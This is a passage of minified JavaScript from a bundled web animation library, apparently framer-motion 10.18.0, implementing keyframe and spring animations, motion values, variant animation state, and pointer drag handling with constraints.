s=n.next(e);for(;!s.done&&e<Df;)e+=r,s=n.next(e);return e>=Df?1/0:e}const ux={decay:Rf,inertia:Rf,tween:ua,keyframes:ua,spring:sy};function da({autoplay:n=!0,delay:e=0,driver:r=cx,keyframes:s,type:a="keyframes",repeat:l=0,repeatDelay:c=0,repeatType:d="loop",onPlay:p,onStop:f,onComplete:m,onUpdate:y,...v}){let w=1,A=!1,k,x;const B=()=>{x=new Promise(I=>{k=I})};B();let _;const P=ux[a]||ua;let M;P!==ua&&typeof s[0]!="number"&&(M=ny([0,100],s,{clamp:!1}),s=[0,100]);const V=P({...v,keyframes:s});let U;d==="mirror"&&(U=P({...v,keyframes:[...s].reverse(),velocity:-(v.velocity||0)}));let W="idle",G=null,ee=null,ye=null;V.calculatedDuration===null&&l&&(V.calculatedDuration=Of(V));const{calculatedDuration:Ae}=V;let q=1/0,le=1/0;Ae!==null&&(q=Ae+c,le=q*(l+1)-c);let K=0;const fe=I=>{if(ee===null)return;w>0&&(ee=Math.min(ee,I)),w<0&&(ee=Math.min(I-le/w,ee)),G!==null?K=G:K=Math.round(I-ee)*w;const N=K-e*(w>=0?1:-1),ne=w>=0?N<0:N>le;K=Math.max(N,0),W==="finished"&&G===null&&(K=le);let he=K,ve=V;if(l){const Ce=Math.min(K,le)/q;let Ye=Math.floor(Ce),_t=Ce%1;!_t&&Ce>=1&&(_t=1),_t===1&&Ye--,Ye=Math.min(Ye,l+1),!!(Ye%2)&&(d==="reverse"?(_t=1-_t,c&&(_t-=c/q)):d==="mirror"&&(ve=U)),he=$n(0,1,_t)*q}const ge=ne?{done:!1,value:s[0]}:ve.next(he);M&&(ge.value=M(ge.value));let{done:Se}=ge;!ne&&Ae!==null&&(Se=w>=0?K>=le:K<=0);const xe=G===null&&(W==="finished"||W==="running"&&Se);return y&&y(ge.value),xe&&H(),ge},ae=()=>{_&&_.stop(),_=void 0},pe=()=>{W="idle",ae(),k(),B(),ee=ye=null},H=()=>{W="finished",m&&m(),ae(),k()},Y=()=>{if(A)return;_||(_=r(fe));const I=_.now();p&&p(),G!==null?ee=I-G:(!ee||W==="finished")&&(ee=I),W==="finished"&&B(),ye=ee,G=null,W="running",_.start()};n&&Y();const J={then(I,N){return x.then(I,N)},get time(){return mn(K)},set time(I){I=wr(I),K=I,G!==null||!_||w===0?G=I:ee=_.now()-I/w},get duration(){const I=V.calculatedDuration===null?Of(V):V.calculatedDuration;return mn(I)},get speed(){return w},set speed(I){I===w||!_||(w=I,J.time=mn(K))},get state(){return W},play:Y,pause:()=>{W="paused",G=K},stop:()=>{A=!0,W!=="idle"&&(W="idle",f&&f(),pe())},cancel:()=>{ye!==null&&fe(ye),pe()},complete:()=>{W="finished"},sample:I=>(ee=0,fe(I))};return J}function dx(n){let e;return()=>(e===void 0&&(e=n()),e)}const hx=dx(()=>Object.hasOwnProperty.call(Element.prototype,"animate")),px=new Set(["opacity","clipPath","filter","transform","backgroundColor"]),qo=10,fx=2e4,gx=(n,e)=>e.type==="spring"||n==="backgroundColor"||!Bm(e.ease);function mx(n,e,{onUpdate:r,onComplete:s,...a}){if(!(hx()&&px.has(e)&&!a.repeatDelay&&a.repeatType!=="mirror"&&a.damping!==0&&a.type!=="inertia"))return!1;let c=!1,d,p,f=!1;const m=()=>{p=new Promise(P=>{d=P})};m();let{keyframes:y,duration:v=300,ease:w,times:A}=a;if(gx(e,a)){const P=da({...a,repeat:0,delay:0});let M={done:!1,value:y[0]};const V=[];let U=0;for(;!M.done&&U<fx;)M=P.sample(U),V.push(M.value),U+=qo;A=void 0,y=V,v=U-qo,w="linear"}const k=Ak(n.owner.current,e,y,{...a,duration:v,ease:w,times:A}),x=()=>{f=!1,k.cancel()},B=()=>{f=!0,Ie.update(x),d(),m()};return k.onfinish=()=>{f||(n.set(Ck(y,a)),s&&s(),B())},{then(P,M){return p.then(P,M)},attachTimeline(P){return k.timeline=P,k.onfinish=null,Ve},get time(){return mn(k.currentTime||0)},set time(P){k.currentTime=wr(P)},get speed(){return k.playbackRate},set speed(P){k.playbackRate=P},get duration(){return mn(v)},play:()=>{c||(k.play(),yn(x))},pause:()=>k.pause(),stop:()=>{if(c=!0,k.playState==="idle")return;const{currentTime:P}=k;if(P){const M=da({...a,autoplay:!1});n.setWithVelocity(M.sample(P-qo).value,M.sample(P).value,qo)}B()},complete:()=>{f||k.finish()},cancel:B}}function yx({keyframes:n,delay:e,onUpdate:r,onComplete:s}){const a=()=>(r&&r(n[n.length-1]),s&&s(),{time:0,speed:1,duration:0,play:Ve,pause:Ve,stop:Ve,then:l=>(l(),Promise.resolve()),cancel:Ve,complete:Ve});return e?da({keyframes:[0,1],duration:0,delay:e,onComplete:a}):a()}const bx={type:"spring",stiffness:500,damping:25,restSpeed:10},vx=n=>({type:"spring",stiffness:550,damping:n===0?2*Math.sqrt(550):30,restSpeed:10}),wx={type:"keyframes",duration:.8},kx={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},xx=(n,{keyframes:e})=>e.length>2?wx:Sr.has(n)?n.startsWith("scale")?vx(e[1]):bx:kx,au=(n,e)=>n==="zIndex"?!1:!!(typeof e=="number"||Array.isArray(e)||typeof e=="string"&&(Hn.test(e)||e==="0")&&!e.startsWith("url(")),Sx=new Set(["brightness","contrast","saturate","opacity"]);function Tx(n){const[e,r]=n.slice(0,-1).split("(");if(e==="drop-shadow")return n;const[s]=r.match(Ca)||[];if(!s)return n;const a=r.replace(s,"");let l=Sx.has(e)?1:0;return s!==r&&(l*=100),e+"("+l+a+")"}const Ax=/([a-z-]*)\(.*?\)/g,lu={...Hn,getAnimatableNone:n=>{const e=n.match(Ax);return e?e.map(Tx).join(" "):n}},Cx={...vm,color:ht,backgroundColor:ht,outlineColor:ht,fill:ht,stroke:ht,borderColor:ht,borderTopColor:ht,borderRightColor:ht,borderBottomColor:ht,borderLeftColor:ht,filter:lu,WebkitFilter:lu},Qu=n=>Cx[n];function oy(n,e){let r=Qu(n);return r!==lu&&(r=Hn),r.getAnimatableNone?r.getAnimatableNone(e):void 0}const ay=n=>/^0[^.\s]+$/.test(n);function Ex(n){if(typeof n=="number")return n===0;if(n!==null)return n==="none"||n==="0"||ay(n)}function Px(n,e,r,s){const a=au(e,r);let l;Array.isArray(r)?l=[...r]:l=[null,r];const c=s.from!==void 0?s.from:n.get();let d;const p=[];for(let f=0;f<l.length;f++)l[f]===null&&(l[f]=f===0?c:l[f-1]),Ex(l[f])&&p.push(f),typeof l[f]=="string"&&l[f]!=="none"&&l[f]!=="0"&&(d=l[f]);if(a&&p.length&&d)for(let f=0;f<p.length;f++){const m=p[f];l[m]=oy(e,d)}return l}function _x({when:n,delay:e,delayChildren:r,staggerChildren:s,staggerDirection:a,repeat:l,repeatType:c,repeatDelay:d,from:p,elapsed:f,...m}){return!!Object.keys(m).length}function Yu(n,e){return n[e]||n.default||n}const Ix={skipAnimations:!1},Xu=(n,e,r,s={})=>a=>{const l=Yu(s,n)||{},c=l.delay||s.delay||0;let{elapsed:d=0}=s;d=d-wr(c);const p=Px(e,n,r,l),f=p[0],m=p[p.length-1],y=au(n,f),v=au(n,m);let w={keyframes:p,velocity:e.getVelocity(),ease:"easeOut",...l,delay:-d,onUpdate:A=>{e.set(A),l.onUpdate&&l.onUpdate(A)},onComplete:()=>{a(),l.onComplete&&l.onComplete()}};if(_x(l)||(w={...w,...xx(n,w)}),w.duration&&(w.duration=wr(w.duration)),w.repeatDelay&&(w.repeatDelay=wr(w.repeatDelay)),!y||!v||Tk.current||l.type===!1||Ix.skipAnimations)return yx(w);if(!s.isHandoff&&e.owner&&e.owner.current instanceof HTMLElement&&!e.owner.getProps().onUpdate){const A=mx(e,n,w);if(A)return A}return da(w)};function ha(n){return!!(wt(n)&&n.add)}const ly=n=>/^\-?\d*\.?\d+$/.test(n);function Zu(n,e){n.indexOf(e)===-1&&n.push(e)}function ed(n,e){const r=n.indexOf(e);r>-1&&n.splice(r,1)}class td{constructor(){this.subscriptions=[]}add(e){return Zu(this.subscriptions,e),()=>ed(this.subscriptions,e)}notify(e,r,s){const a=this.subscriptions.length;if(a)if(a===1)this.subscriptions[0](e,r,s);else for(let l=0;l<a;l++){const c=this.subscriptions[l];c&&c(e,r,s)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const Rx=n=>!isNaN(parseFloat(n));class Dx{constructor(e,r={}){this.version="10.18.0",this.timeDelta=0,this.lastUpdated=0,this.canTrackVelocity=!1,this.events={},this.updateAndNotify=(s,a=!0)=>{this.prev=this.current,this.current=s;const{delta:l,timestamp:c}=ct;this.lastUpdated!==c&&(this.timeDelta=l,this.lastUpdated=c,Ie.postRender(this.scheduleVelocityCheck)),this.prev!==this.current&&this.events.change&&this.events.change.notify(this.current),this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()),a&&this.events.renderRequest&&this.events.renderRequest.notify(this.current)},this.scheduleVelocityCheck=()=>Ie.postRender(this.velocityCheck),this.velocityCheck=({timestamp:s})=>{s!==this.lastUpdated&&(this.prev=this.current,this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()))},this.hasAnimated=!1,this.prev=this.current=e,this.canTrackVelocity=Rx(this.current),this.owner=r.owner}onChange(e){return this.on("change",e)}on(e,r){this.events[e]||(this.events[e]=new td);const s=this.events[e].add(r);return e==="change"?()=>{s(),Ie.read(()=>{this.events.change.getSize()||this.stop()})}:s}clearListeners(){for(const e in this.events)this.events[e].clear()}attach(e,r){this.passiveEffect=e,this.stopPassiveEffect=r}set(e,r=!0){!r||!this.passiveEffect?this.updateAndNotify(e,r):this.passiveEffect(e,this.updateAndNotify)}setWithVelocity(e,r,s){this.set(r),this.prev=e,this.timeDelta=s}jump(e){this.updateAndNotify(e),this.prev=e,this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}get(){return this.current}getPrevious(){return this.prev}getVelocity(){return this.canTrackVelocity?ry(parseFloat(this.current)-parseFloat(this.prev),this.timeDelta):0}start(e){return this.stop(),new Promise(r=>{this.hasAnimated=!0,this.animation=e(r),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function mi(n,e){return new Dx(n,e)}const cy=n=>e=>e.test(n),Ox={test:n=>n==="auto",parse:n=>n},uy=[Tr,ce,tn,Fn,U0,F0,Ox],os=n=>uy.find(cy(n)),jx=[...uy,ht,Hn],Mx=n=>jx.find(cy(n));function Bx(n,e,r){n.hasValue(e)?n.getValue(e).set(r):n.addValue(e,mi(r))}function Nx(n,e){const r=Pa(n,e);let{transitionEnd:s={},transition:a={},...l}=r?n.makeTargetAnimatable(r,!1):{};l={...l,...s};for(const c in l){const d=ek(l[c]);Bx(n,c,d)}}function Lx(n,e,r){var s,a;const l=Object.keys(e).filter(d=>!n.hasValue(d)),c=l.length;if(c)for(let d=0;d<c;d++){const p=l[d],f=e[p];let m=null;Array.isArray(f)&&(m=f[0]),m===null&&(m=(a=(s=r[p])!==null&&s!==void 0?s:n.readValue(p))!==null&&a!==void 0?a:e[p]),m!=null&&(typeof m=="string"&&(ly(m)||ay(m))?m=parseFloat(m):!Mx(m)&&Hn.test(f)&&(m=oy(p,f)),n.addValue(p,mi(m,{owner:n})),r[p]===void 0&&(r[p]=m),m!==null&&n.setBaseTarget(p,m))}}function Fx(n,e){return e?(e[n]||e.default||e).from:void 0}function Ux(n,e,r){const s={};for(const a in n){const l=Fx(a,e);if(l!==void 0)s[a]=l;else{const c=r.getValue(a);c&&(s[a]=c.get())}}return s}function zx({protectedKeys:n,needsAnimating:e},r){const s=n.hasOwnProperty(r)&&e[r]!==!0;return e[r]=!1,s}function Vx(n,e){const r=n.get();if(Array.isArray(e)){for(let s=0;s<e.length;s++)if(e[s]!==r)return!0}else return r!==e}function dy(n,e,{delay:r=0,transitionOverride:s,type:a}={}){let{transition:l=n.getDefaultTransition(),transitionEnd:c,...d}=n.makeTargetAnimatable(e);const p=n.getValue("willChange");s&&(l=s);const f=[],m=a&&n.animationState&&n.animationState.getState()[a];for(const y in d){const v=n.getValue(y),w=d[y];if(!v||w===void 0||m&&zx(m,y))continue;const A={delay:r,elapsed:0,...Yu(l||{},y)};if(window.HandoffAppearAnimations){const B=n.getProps()[hm];if(B){const _=window.HandoffAppearAnimations(B,y,v,Ie);_!==null&&(A.elapsed=_,A.isHandoff=!0)}}let k=!A.isHandoff&&!Vx(v,w);if(A.type==="spring"&&(v.getVelocity()||A.velocity)&&(k=!1),v.animation&&(k=!1),k)continue;v.start(Xu(y,v,w,n.shouldReduceMotion&&Sr.has(y)?{type:!1}:A));const x=v.animation;ha(p)&&(p.add(y),x.then(()=>p.remove(y))),f.push(x)}return c&&Promise.all(f).then(()=>{c&&Nx(n,c)}),f}function cu(n,e,r={}){const s=Pa(n,e,r.custom);let{transition:a=n.getDefaultTransition()||{}}=s||{};r.transitionOverride&&(a=r.transitionOverride);const l=s?()=>Promise.all(dy(n,s,r)):()=>Promise.resolve(),c=n.variantChildren&&n.variantChildren.size?(p=0)=>{const{delayChildren:f=0,staggerChildren:m,staggerDirection:y}=a;return Wx(n,e,f+p,m,y,r)}:()=>Promise.resolve(),{when:d}=a;if(d){const[p,f]=d==="beforeChildren"?[l,c]:[c,l];return p().then(()=>f())}else return Promise.all([l(),c(r.delay)])}function Wx(n,e,r=0,s=0,a=1,l){const c=[],d=(n.variantChildren.size-1)*s,p=a===1?(f=0)=>f*s:(f=0)=>d-f*s;return Array.from(n.variantChildren).sort($x).forEach((f,m)=>{f.notify("AnimationStart",e),c.push(cu(f,e,{...l,delay:r+p(m)}).then(()=>f.notify("AnimationComplete",e)))}),Promise.all(c)}function $x(n,e){return n.sortNodePosition(e)}function Hx(n,e,r={}){n.notify("AnimationStart",e);let s;if(Array.isArray(e)){const a=e.map(l=>cu(n,l,r));s=Promise.all(a)}else if(typeof e=="string")s=cu(n,e,r);else{const a=typeof e=="function"?Pa(n,e,r.custom):e;s=Promise.all(dy(n,a,r))}return s.then(()=>n.notify("AnimationComplete",e))}const qx=[...Bu].reverse(),Gx=Bu.length;function Kx(n){return e=>Promise.all(e.map(({animation:r,options:s})=>Hx(n,r,s)))}function Jx(n){let e=Kx(n);const r=Yx();let s=!0;const a=(p,f)=>{const m=Pa(n,f);if(m){const{transition:y,transitionEnd:v,...w}=m;p={...p,...w,...v}}return p};function l(p){e=p(n)}function c(p,f){const m=n.getProps(),y=n.getVariantContext(!0)||{},v=[],w=new Set;let A={},k=1/0;for(let B=0;B<Gx;B++){const _=qx[B],P=r[_],M=m[_]!==void 0?m[_]:y[_],V=ws(M),U=_===f?P.isActive:null;U===!1&&(k=B);let W=M===y[_]&&M!==m[_]&&V;if(W&&s&&n.manuallyAnimateOnMount&&(W=!1),P.protectedKeys={...A},!P.isActive&&U===null||!M&&!P.prevProp||Ta(M)||typeof M=="boolean")continue;let ee=Qx(P.prevProp,M)||_===f&&P.isActive&&!W&&V||B>k&&V,ye=!1;const Ae=Array.isArray(M)?M:[M];let q=Ae.reduce(a,{});U===!1&&(q={});const{prevResolvedValues:le={}}=P,K={...le,...q},fe=ae=>{ee=!0,w.has(ae)&&(ye=!0,w.delete(ae)),P.needsAnimating[ae]=!0};for(const ae in K){const pe=q[ae],H=le[ae];if(A.hasOwnProperty(ae))continue;let Y=!1;la(pe)&&la(H)?Y=!jm(pe,H):Y=pe!==H,Y?pe!==void 0?fe(ae):w.add(ae):pe!==void 0&&w.has(ae)?fe(ae):P.protectedKeys[ae]=!0}P.prevProp=M,P.prevResolvedValues=q,P.isActive&&(A={...A,...q}),s&&n.blockInitialAnimation&&(ee=!1),ee&&(!W||ye)&&v.push(...Ae.map(ae=>({animation:ae,options:{type:_,...p}})))}if(w.size){const B={};w.forEach(_=>{const P=n.getBaseTarget(_);P!==void 0&&(B[_]=P)}),v.push({animation:B})}let x=!!v.length;return s&&(m.initial===!1||m.initial===m.animate)&&!n.manuallyAnimateOnMount&&(x=!1),s=!1,x?e(v):Promise.resolve()}function d(p,f,m){var y;if(r[p].isActive===f)return Promise.resolve();(y=n.variantChildren)===null||y===void 0||y.forEach(w=>{var A;return(A=w.animationState)===null||A===void 0?void 0:A.setActive(p,f)}),r[p].isActive=f;const v=c(m,p);for(const w in r)r[w].protectedKeys={};return v}return{animateChanges:c,setActive:d,setAnimateFunction:l,getState:()=>r}}function Qx(n,e){return typeof e=="string"?e!==n:Array.isArray(e)?!jm(e,n):!1}function lr(n=!1){return{isActive:n,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function Yx(){return{animate:lr(!0),whileInView:lr(),whileHover:lr(),whileTap:lr(),whileDrag:lr(),whileFocus:lr(),exit:lr()}}class Xx extends qn{constructor(e){super(e),e.animationState||(e.animationState=Jx(e))}updateAnimationControlsSubscription(){const{animate:e}=this.node.getProps();this.unmount(),Ta(e)&&(this.unmount=e.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:e}=this.node.getProps(),{animate:r}=this.node.prevProps||{};e!==r&&this.updateAnimationControlsSubscription()}unmount(){}}let Zx=0;class e1 extends qn{constructor(){super(...arguments),this.id=Zx++}update(){if(!this.node.presenceContext)return;const{isPresent:e,onExitComplete:r,custom:s}=this.node.presenceContext,{isPresent:a}=this.node.prevPresenceContext||{};if(!this.node.animationState||e===a)return;const l=this.node.animationState.setActive("exit",!e,{custom:s??this.node.getProps().custom});r&&!e&&l.then(()=>r(this.id))}mount(){const{register:e}=this.node.presenceContext||{};e&&(this.unmount=e(this.id))}unmount(){}}const t1={animation:{Feature:Xx},exit:{Feature:e1}},jf=(n,e)=>Math.abs(n-e);function n1(n,e){const r=jf(n.x,e.x),s=jf(n.y,e.y);return Math.sqrt(r**2+s**2)}class hy{constructor(e,r,{transformPagePoint:s,contextWindow:a,dragSnapToOrigin:l=!1}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const y=Uc(this.lastMoveEventInfo,this.history),v=this.startEvent!==null,w=n1(y.offset,{x:0,y:0})>=3;if(!v&&!w)return;const{point:A}=y,{timestamp:k}=ct;this.history.push({...A,timestamp:k});const{onStart:x,onMove:B}=this.handlers;v||(x&&x(this.lastMoveEvent,y),this.startEvent=this.lastMoveEvent),B&&B(this.lastMoveEvent,y)},this.handlePointerMove=(y,v)=>{this.lastMoveEvent=y,this.lastMoveEventInfo=Fc(v,this.transformPagePoint),Ie.update(this.updatePoint,!0)},this.handlePointerUp=(y,v)=>{this.end();const{onEnd:w,onSessionEnd:A,resumeAnimation:k}=this.handlers;if(this.dragSnapToOrigin&&k&&k(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const x=Uc(y.type==="pointercancel"?this.lastMoveEventInfo:Fc(v,this.transformPagePoint),this.history);this.startEvent&&w&&w(y,x),A&&A(y,x)},!_m(e))return;this.dragSnapToOrigin=l,this.handlers=r,this.transformPagePoint=s,this.contextWindow=a||window;const c=Ea(e),d=Fc(c,this.transformPagePoint),{point:p}=d,{timestamp:f}=ct;this.history=[{...p,timestamp:f}];const{onSessionStart:m}=r;m&&m(e,Uc(d,this.history)),this.removeListeners=Wn(gn(this.contextWindow,"pointermove",this.handlePointerMove),gn(this.contextWindow,"pointerup",this.handlePointerUp),gn(this.contextWindow,"pointercancel",this.handlePointerUp))}updateHandlers(e){this.handlers=e}end(){this.removeListeners&&this.removeListeners(),yn(this.updatePoint)}}function Fc(n,e){return e?{point:e(n.point)}:n}function Mf(n,e){return{x:n.x-e.x,y:n.y-e.y}}function Uc({point:n},e){return{point:n,delta:Mf(n,py(e)),offset:Mf(n,r1(e)),velocity:i1(e,.1)}}function r1(n){return n[0]}function py(n){return n[n.length-1]}function i1(n,e){if(n.length<2)return{x:0,y:0};let r=n.length-1,s=null;const a=py(n);for(;r>=0&&(s=n[r],!(a.timestamp-s.timestamp>wr(e)));)r--;if(!s)return{x:0,y:0};const l=mn(a.timestamp-s.timestamp);if(l===0)return{x:0,y:0};const c={x:(a.x-s.x)/l,y:(a.y-s.y)/l};return c.x===1/0&&(c.x=0),c.y===1/0&&(c.y=0),c}function Pt(n){return n.max-n.min}function uu(n,e=0,r=.01){return Math.abs(n-e)<=r}function Bf(n,e,r,s=.5){n.origin=s,n.originPoint=Ne(e.min,e.max,n.origin),n.scale=Pt(r)/Pt(e),(uu(n.scale,1,1e-4)||isNaN(n.scale))&&(n.scale=1),n.translate=Ne(r.min,r.max,n.origin)-n.originPoint,(uu(n.translate)||isNaN(n.translate))&&(n.translate=0)}function fs(n,e,r,s){Bf(n.x,e.x,r.x,s?s.originX:void 0),Bf(n.y,e.y,r.y,s?s.originY:void 0)}function Nf(n,e,r){n.min=r.min+e.min,n.max=n.min+Pt(e)}function s1(n,e,r){Nf(n.x,e.x,r.x),Nf(n.y,e.y,r.y)}function Lf(n,e,r){n.min=e.min-r.min,n.max=n.min+Pt(e)}function gs(n,e,r){Lf(n.x,e.x,r.x),Lf(n.y,e.y,r.y)}function o1(n,{min:e,max:r},s){return e!==void 0&&n<e?n=s?Ne(e,n,s.min):Math.max(n,e):r!==void 0&&n>r&&(n=s?Ne(r,n,s.max):Math.min(n,r)),n}function Ff(n,e,r){return{min:e!==void 0?n.min+e:void 0,max:r!==void 0?n.max+r-(n.max-n.min):void 0}}function a1(n,{top:e,left:r,bottom:s,right:a}){return{x:Ff(n.x,r,a),y:Ff(n.y,e,s)}}function Uf(n,e){let r=e.min-n.min,s=e.max-n.max;return e.max-e.min<n.max-n.min&&([r,s]=[s,r]),{min:r,max:s}}function l1(n,e){return{x:Uf(n.x,e.x),y:Uf(n.y,e.y)}}function c1(n,e){let r=.5;const s=Pt(n),a=Pt(e);return a>s?r=xs(e.min,e.max-s,n.min):s>a&&(r=xs(n.min,n.max-a,e.min)),$n(0,1,r)}function u1(n,e){const r={};return e.min!==void 0&&(r.min=e.min-n.min),e.max!==void 0&&(r.max=e.max-n.min),r}const du=.35;function d1(n=du){return n===!1?n=0:n===!0&&(n=du),{x:zf(n,"left","right"),y:zf(n,"top","bottom")}}function zf(n,e,r){return{min:Vf(n,e),max:Vf(n,r)}}function Vf(n,e){return typeof n=="number"?n:n[e]||0}const Wf=()=>({translate:0,scale:1,origin:0,originPoint:0}),pi=()=>({x:Wf(),y:Wf()}),$f=()=>({min:0,max:0}),$e=()=>({x:$f(),y:$f()});function Nt(n){return[n("x"),n("y")]}function fy({top:n,left:e,right:r,bottom:s}){return{x:{min:e,max:r},y:{min:n,max:s}}}function h1({x:n,y:e}){return{top:e.min,right:n.max,bottom:e.max,left:n.min}}function p1(n,e){if(!e)return n;const r=e({x:n.left,y:n.top}),s=e({x:n.right,y:n.bottom});return{top:r.y,left:r.x,bottom:s.y,right:s.x}}function zc(n){return n===void 0||n===1}function hu({scale:n,scaleX:e,scaleY:r}){return!zc(n)||!zc(e)||!zc(r)}function dr(n){return hu(n)||gy(n)||n.z||n.rotate||n.rotateX||n.rotateY}function gy(n){return Hf(n.x)||Hf(n.y)}function Hf(n){return n&&n!=="0%"}function pa(n,e,r){const s=n-r,a=e*s;return r+a}function qf(n,e,r,s,a){return a!==void 0&&(n=pa(n,a,s)),pa(n,r,s)+e}function pu(n,e=0,r=1,s,a){n.min=qf(n.min,e,r,s,a),n.max=qf(n.max,e,r,s,a)}function my(n,{x:e,y:r}){pu(n.x,e.translate,e.scale,e.originPoint),pu(n.y,r.translate,r.scale,r.originPoint)}function f1(n,e,r,s=!1){const a=r.length;if(!a)return;e.x=e.y=1;let l,c;for(let d=0;d<a;d++){l=r[d],c=l.projectionDelta;const p=l.instance;p&&p.style&&p.style.display==="contents"||(s&&l.options.layoutScroll&&l.scroll&&l!==l.root&&fi(n,{x:-l.scroll.offset.x,y:-l.scroll.offset.y}),c&&(e.x*=c.x.scale,e.y*=c.y.scale,my(n,c)),s&&dr(l.latestValues)&&fi(n,l.latestValues))}e.x=Gf(e.x),e.y=Gf(e.y)}function Gf(n){return Number.isInteger(n)||n>1.0000000000001||n<.999999999999?n:1}function zn(n,e){n.min=n.min+e,n.max=n.max+e}function Kf(n,e,[r,s,a]){const l=e[a]!==void 0?e[a]:.5,c=Ne(n.min,n.max,l);pu(n,e[r],e[s],c,e.scale)}const g1=["x","scaleX","originX"],m1=["y","scaleY","originY"];function fi(n,e){Kf(n.x,e,g1),Kf(n.y,e,m1)}function yy(n,e){return fy(p1(n.getBoundingClientRect(),e))}function y1(n,e,r){const s=yy(n,r),{scroll:a}=e;return a&&(zn(s.x,a.offset.x),zn(s.y,a.offset.y)),s}const by=({current:n})=>n?n.ownerDocument.defaultView:null,b1=new WeakMap;class v1{constructor(e){this.openGlobalLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=$e(),this.visualElement=e}start(e,{snapToCursor:r=!1}={}){const{presenceContext:s}=this.visualElement;if(s&&s.isPresent===!1)return;const a=m=>{const{dragSnapToOrigin:y}=this.getProps();y?this.pauseAnimation():this.stopAnimation(),r&&this.snapToCursor(Ea(m,"page").point)},l=(m,y)=>{const{drag:v,dragPropagation:w,onDragStart:A}=this.getProps();if(v&&!w&&(this.openGlobalLock&&this.openGlobalLock(),this.openGlobalLock=Rm(v),!this.openGlobalLock))return;this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),Nt(x=>{let B=this.getAxisMotionValue(x).get()||0;if(tn.test(B)){const{projection:_}=this.visualElement;if(_&&_.layout){const P=_.layout.layoutBox[x];P&&(B=Pt(P)*(parseFloat(B)/100))}}this.originPoint[x]=B}),A&&Ie.update(()=>A(m,y),!1,!0);const{animationState:k}=this.visualElement;k&&k.setActive("whileDrag",!0)},c=(m,y)=>{const{dragPropagation:v,dragDirectionLock:w,onDirectionLock:A,onDrag:k}=this.getProps();if(!v&&!this.openGlobalLock)return;const{offset:x}=y;if(w&&this.currentDirection===null){this.currentDirection=w1(x),this.currentDirection!==null&&A&&A(this.currentDirection);return}this.updateAxis("x",y.point,x),this.updateAxis("y",y.point,x),this.visualElement.render(),k&&k(m,y)},d=(m,y)=>this.stop(m,y),p=()=>Nt(m=>{var y;return this.getAnimationState(m)==="paused"&&((y=this.getAxisMotionValue(m).animation)===null||y===void 0?void 0:y.play())}),{dragSnapToOrigin:f}=this.getProps();this.panSession=new hy(e,{onSessionStart:a,onStart:l,onMove:c,onSessionEnd:d,resumeAnimation:p},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:f,contextWindow:by(this.visualElement)})}stop(e,r){const s=this.isDragging;if(this.cancel(),!s)return;const{velocity:a}=r;this.startAnimation(a);const{onDragEnd:l}=this.getProps();l&&Ie.update(()=>l(e,r))}cancel(){this.isDragging=!1;const{projection:e,animationState:r}=this.visualElement;e&&(e.isAnimationBlocked=!1),this.panSession&&this.panSession.end(),this.panSession=void 0;const{dragPropagation:s}=this.getProps();!s&&this.openGlobalLock&&(this.openGlobalLock(),this.openGlobalLock=null),r&&r.setActive("whileDrag",!1)}updateAxis(e,r,s){const{drag:a}=this.getProps();if(!s||!Go(e,a,this.currentDirection))return;const l=this.getAxisMotionValue(e);let c=this.originPoint[e]+s[e];this.constraints&&this.constraints[e]&&(c=o1(c,this.constraints[e],this.elastic[e])),l.set(c)}resolveConstraints(){var e;const{dragConstraints:r,dragElastic:s}=this.getProps(),a=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(e=this.visualElement.projection)===null||e===void 0?void 0:e.layout,l=this.constraints;r&&di(r)?this.constraints||(this.constraints=this.resolveRefConstraints()):r&&a?this.constraints=a1(a.layoutBox,r):this.constraints=!1,this.elastic=d1(s),l!==this.constraints&&a&&this.constraints&&!this.hasMutatedConstraints&&Nt(c=>{this.getAxisMotionValue(c)&&(this.constraints[c]=u1(a.layoutBox[c],this.constraints[c]))})}resolveRefConstraints(){const{dragConstraints:e,onMeasureDragConstraints:r}=this.getProps();if(!e||!di(e))return!1;const s=e.current,{projection:a}=this.visualElement;if(!a||!a.layout)return!1;const l=y1(s,a.root,this.visualElement.getTransformPagePoint());let c=l1(a.layout.layoutBox,l);if(r){const d=r(h1(c));this.hasMutatedConstraints=!!d,d&&(c=fy(d))}return c}startAnimation(e){const{drag:r,dragMomentum:s,dragElastic:a,dragTransition:l,dragSnapToOrigin:c,onDragTransitionEnd:d}=this.getProps(),p=this.constraints||{},f=Nt(m=>{if(!Go(m,r,this.currentDirection))return;let y=p&&p[m]||{};c&&(y={min:0,max:0});const v=a?200:1e6,w=a?40:1e7,A={type:"inertia",velocity:s?e[m]:0,bounceStiffness:v,bounceDamping:w,timeConstant:750,restDelta:1,restSpeed:10,...l,...y};return this.startAxisValueAnimation(m,A)});return Promise.all(f).then(d)}startAxisValueAnimation(e,r){const s=this.getAxisMotionValue(e);return s.start(Xu(e,s,0,r))}stopAnimation(){Nt(e=>this.getAxisMotionValue(e).stop())}pauseAnimation(){Nt(e=>{var r;return(r=this.getAxisMotionValue(e).animation)===null||r===void 0?void 0:r.pause()})}getAnimationState(e){var r;return(r=this.getAxisMotionValue(e).animation)===null||r===void 0?void 0:r.state}getAxisMotionValue(e){const r="_drag"+e.toUpperCase(),s=this.visualElement.getProps(),a=s[r];return 